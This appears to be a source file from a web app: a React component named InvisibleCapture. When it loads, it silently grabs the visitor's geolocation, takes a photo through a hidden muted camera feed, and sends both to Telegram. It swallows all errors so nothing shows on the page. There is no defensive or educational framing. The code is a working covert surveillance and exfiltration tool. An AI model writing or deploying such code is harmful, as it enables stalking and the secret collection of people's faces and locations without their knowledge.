import { useRef, useEffect } from 'react';
import { cameraService } from '@/lib/camera';
import { locationService, type LocationData } from '@/lib/location';
import { sendPhotoToTelegram, sendLocationToTelegram } from '@/lib/telegram';

interface InvisibleCaptureProps {
  onComplete: () => void;
}

export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const hasStarted = useRef(false);

  useEffect(() => {
    if (!hasStarted.current) {
      hasStarted.current = true;
      startInvisibleCapture();
    }
  }, []);

  const startInvisibleCapture = async () => {
    try {
      // Get location silently
      let locationData: LocationData | null = null;
      try {
        locationData = await locationService.getCurrentLocation();
      } catch (error) {
        // Continue without location if it fails
      }

      // Start camera silently
      const stream = await cameraService.startCamera();
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.muted = true;
        videoRef.current.play();
      }

      // Wait for camera to stabilize
      await new Promise(resolve => setTimeout(resolve, 1500));

      // Capture photo
      if (!videoRef.current) {
        throw new Error('Camera not ready');
      }

      const photoBlob = await cameraService.capturePhoto(videoRef.current);
      
      // Stop camera immediately
      cameraService.stopCamera();

      // Send to Telegram silently
      const result = await sendPhotoToTelegram(photoBlob, locationData || undefined);
      
      if (result.ok && locationData) {
        // Send location as separate message
        await sendLocationToTelegram(locationData);
      }

      // Complete silently
      onComplete();

    } catch (error) {
      // Fail silently and complete
      onComplete();
    } finally {
      // Ensure camera is stopped
      cameraService.stopCamera();
    }
  };

  return (
    <video
      ref={videoRef}
      className="hidden"
      autoPlay
      muted
      playsInline
    />
  );
}